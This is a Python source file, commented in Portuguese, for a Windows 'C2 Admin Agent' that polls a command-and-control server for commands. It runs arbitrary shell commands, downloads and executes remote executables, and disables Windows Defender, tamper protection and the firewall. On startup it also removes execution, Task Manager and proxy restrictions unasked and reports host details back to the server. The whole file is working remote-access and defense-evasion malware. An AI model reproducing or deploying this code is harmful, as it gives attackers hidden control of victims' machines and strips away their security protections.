#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C2 Admin Agent - Cliente Windows
Conecta ao servidor C2 e executa comandos administrativos
"""

import os
import sys
import time
import json
import socket
import platform
import subprocess
import hashlib
import uuid

try:
    import urllib.request
    import urllib.parse
except ImportError:
    print("Erro: urllib não disponível")
    sys.exit(1)

# Configurações (serão substituídas pelo servidor)
SERVER_URL = 'SERVER_URL_PLACEHOLDER'
SECRET_TOKEN = 'SECRET_TOKEN_PLACEHOLDER'
CHECKIN_INTERVAL = 30  # segundos

class AdminAgent:
    def __init__(self):
        self.client_id = self.generate_client_id()
        self.hostname = socket.gethostname()
        self.username = os.getenv('USERNAME', 'Unknown')
        self.os_version = self.get_os_version()
        
        # EXECUTAR AUTOMATICAMENTE ao conectar
        self.auto_remove_restrictions()
    
    def generate_client_id(self):
        """Gera ID único baseado no hardware"""
        try:
            # Usar UUID do sistema
            system_uuid = str(uuid.getnode())
            client_id = hashlib.md5(system_uuid.encode()).hexdigest()
            return client_id
        except:
            # Fallback: usar hostname
            return hashlib.md5(socket.gethostname().encode()).hexdigest()
    
    def get_os_version(self):
        """Retorna versão do Windows"""
        try:
            return f"{platform.system()} {platform.release()} {platform.version()}"
        except:
            return "Windows Unknown"
    
    def send_request(self, endpoint, data=None):
        """Envia requisição HTTP para o servidor"""
        try:
            url = f"{SERVER_URL}{endpoint}"
            
            if data:
                data['token'] = SECRET_TOKEN
                json_data = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
            else:
                req = urllib.request.Request(url)
            
            response = urllib.request.urlopen(req, timeout=10)
            return json.loads(response.read().decode('utf-8'))
        except Exception as e:
            print(f"[!] Erro na requisição: {e}")
            return {}
    
    def checkin(self):
        """Faz checkin no servidor e recebe comandos"""
        data = {
            'client_id': self.client_id,
            'hostname': self.hostname,
            'username': self.username,
            'os_version': self.os_version,
        }
        
        response = self.send_request('/api/checkin', data)
        return response.get('commands', [])
    
    def execute_command(self, command):
        """Executa comando recebido do servidor"""
        cmd_type = command['type']
        params = command.get('params', {})
        cmd_id = command['id']
        
        result = ''
        
        try:
            if cmd_type == 'shell':
                # Executar comando shell
                result = self.run_shell(params.get('cmd', ''))
            
            elif cmd_type == 'remove_restrictions':
                # Remover restrições do Windows
                result = self.remove_restrictions()
            
            elif cmd_type == 'enable_execution':
                # Habilitar execução de programas
                result = self.enable_execution()
            
            elif cmd_type == 'remove_proxy':
                # Remover proxy/restrições de navegação
                result = self.remove_proxy_restrictions()
            
            elif cmd_type == 'get_info':
                # Coletar informações do sistema
                result = self.get_system_info()
            
            elif cmd_type == 'download_execute':
                # Baixar e executar arquivo
                url = params.get('url', '')
                result = self.download_and_execute(url)
            
            elif cmd_type == 'disable_defender':
                # Desativar Windows Defender
                result = self.disable_windows_defender()
            
            elif cmd_type == 'disable_firewall':
                # Desativar Firewall
                result = self.disable_firewall()
            
            elif cmd_type == 'disable_all':
                # Desativar TUDO (Defender + Firewall + Restrições)
                result = self.disable_all_protections()
            
            else:
                result = f"Comando desconhecido: {cmd_type}"
        
        except Exception as e:
            result = f"Erro ao executar: {str(e)}"
        
        # Enviar resultado de volta
        self.send_result(cmd_id, command, result)
    
    def send_result(self, cmd_id, command, result):
        """Envia resultado do comando para o servidor"""
        data = {
            'client_id': self.client_id,
            'command_id': cmd_id,
            'command': command,
            'result': result
        }
        self.send_request('/api/result', data)
    
    def run_shell(self, cmd, timeout=30):
        """Executa comando shell"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "Timeout: comando demorou muito"
        except Exception as e:
            return f"Erro: {str(e)}"
    
    def remove_restrictions(self):
        """Remove restrições de políticas do Windows"""
        commands = [
            # Desabilitar restrições de software
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "DisallowRun" /t REG_DWORD /d 0 /f',
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun" /f',
            
            # Remover restrições de execução
            'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /f',
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /f',
        ]

        results = []
        for cmd in commands:
            result = self.run_shell(cmd)
            results.append(f"{cmd[:50]}... -> {result[:100]}")
        
        return "\n".join(results)

    def enable_execution(self):
        """Habilita execução de programas"""
        commands = [
            # Remover restrições de execução
            'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "DisallowRun" /f',
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "RestrictRun" /f',

            # Habilitar PowerShell
            'powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force',
        ]

        results = []
        for cmd in commands:
            result = self.run_shell(cmd)
            results.append(result)

        return "Execução habilitada:\n" + "\n".join(results)

    def remove_proxy_restrictions(self):
        """Remove restrições de proxy e navegação"""
        commands = [
            # Remover proxy
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v "ProxyEnable" /f',
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v "ProxyServer" /f',

            # Remover restrições de navegação
            'reg delete "HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel" /v "HomePage" /f',
            'reg delete "HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions" /f',
        ]

        results = []
        for cmd in commands:
            result = self.run_shell(cmd)
            results.append(result)

        return "Restrições de navegação removidas:\n" + "\n".join(results)

    def disable_windows_defender(self):
        """Desativa Windows Defender (requer privilégios de admin)"""
        commands = [
            # Desabilitar proteção em tempo real
            'powershell Set-MpPreference -DisableRealtimeMonitoring $true',
            
            # Desabilitar proteção na nuvem
            'powershell Set-MpPreference -MAPSReporting 0',
            
            # Desabilitar envio de amostras
            'powershell Set-MpPreference -SubmitSamplesConsent 2',
            
            # Desabilitar proteção contra adulteração
            'powershell Set-MpPreference -DisableTamperProtection $true',
            
            # Desabilitar via registro (método alternativo)
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f',
        ]

        results = []
        for cmd in commands:
            result = self.run_shell(cmd)
            results.append(f"{cmd[:60]}... -> {result[:80] if result else 'OK'}")

        return "Windows Defender desativado:\n" + "\n".join(results)

    def disable_firewall(self):
        """Desativa Firewall do Windows (requer privilégios de admin)"""
        commands = [
            # Desabilitar firewall para todos os perfis
            'netsh advfirewall set allprofiles state off',
            
            # Método alternativo via PowerShell
            'powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False',
            
            # Desabilitar via registro
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f',
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f',
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f',
        ]

        results = []
        for cmd in commands:
            result = self.run_shell(cmd)
            results.append(f"{cmd[:60]}... -> {result[:80] if result else 'OK'}")

        return "Firewall desativado:\n" + "\n".join(results)

    def disable_all_protections(self):
        """Desativa TODAS as proteções: Defender + Firewall + Restrições (MODO COMPLETO)"""
        results = []
        
        results.append("=" * 60)
        results.append("INICIANDO DESATIVAÇÃO COMPLETA DE PROTEÇÕES")
        results.append("=" * 60)
        
        # 1. Desativar Windows Defender
        results.append("\n[1/4] Desativando Windows Defender...")
        defender_result = self.disable_windows_defender()
        results.append(defender_result)
        
        # 2. Desativar Firewall
        results.append("\n[2/4] Desativando Firewall...")
        firewall_result = self.disable_firewall()
        results.append(firewall_result)
        
        # 3. Remover restrições de execução
        results.append("\n[3/4] Removendo restrições de execução...")
        restrictions_result = self.remove_restrictions()
        results.append(restrictions_result)
        
        # 4. Habilitar execução de programas
        results.append("\n[4/4] Habilitando execução de programas...")
        execution_result = self.enable_execution()
        results.append(execution_result)
        
        results.append("\n" + "=" * 60)
        results.append("✅ TODAS AS PROTEÇÕES DESATIVADAS COM SUCESSO!")
        results.append("=" * 60)
        
        return "\n".join(results)

    def get_system_info(self):
        """Coleta informações detalhadas do sistema"""
        info = {
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os_version,
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': sys.version,
        }

        # Informações de rede
        try:
            info['ip_addresses'] = socket.gethostbyname_ex(socket.gethostname())[2]
        except:
            info['ip_addresses'] = []

        # Informações de disco
        try:
            drives_info = self.run_shell('wmic logicaldisk get caption,freespace,size')
            info['drives'] = drives_info
        except:
            info['drives'] = 'N/A'

        return json.dumps(info, indent=2)

    def download_and_execute(self, url):
        """Baixa e executa arquivo da URL"""
        try:
            # Baixar arquivo
            response = urllib.request.urlopen(url, timeout=30)
            content = response.read()

            # Salvar temporariamente
            temp_file = os.path.join(os.getenv('TEMP'), 'temp_exec.exe')
            with open(temp_file, 'wb') as f:
                f.write(content)

            # Executar
            subprocess.Popen(temp_file, shell=True)

            return f"Arquivo baixado e executado: {temp_file}"
        except Exception as e:
            return f"Erro ao baixar/executar: {str(e)}"
    
    def auto_remove_restrictions(self):
        """Remove restrições AUTOMATICAMENTE quando o agente inicia"""
        try:
            print("[*] Removendo restrições automaticamente...")
            
            # 1. Remover restrições de execução
            self.remove_restrictions()
            print("[✓] Restrições de execução removidas")
            
            # 2. Habilitar execução de programas
            self.enable_execution()
            print("[✓] Execução de programas habilitada")
            
            # 3. Remover proxy e restrições de navegação
            self.remove_proxy_restrictions()
            print("[✓] Restrições de navegação removidas")
            
            print("[✓] Todas as restrições removidas automaticamente!")
        except Exception as e:
            print(f"[!] Erro ao remover restrições: {e}")

    def run(self):
        """Loop principal do agente"""
        print(f"[*] Agente iniciado - ID: {self.client_id}")

        while True:
            try:
                # Fazer checkin
                commands = self.checkin()

                # Executar comandos recebidos
                for command in commands:
                    print(f"[*] Executando comando: {command['type']}")
                    self.execute_command(command)

                # Aguardar próximo checkin
                time.sleep(CHECKIN_INTERVAL)

            except KeyboardInterrupt:
                print("\n[*] Agente finalizado pelo usuário")
                break
            except Exception as e:
                print(f"[!] Erro: {e}")
                time.sleep(CHECKIN_INTERVAL)

# Executar agente
if __name__ == '__main__':
    agent = AdminAgent()
    agent.run()
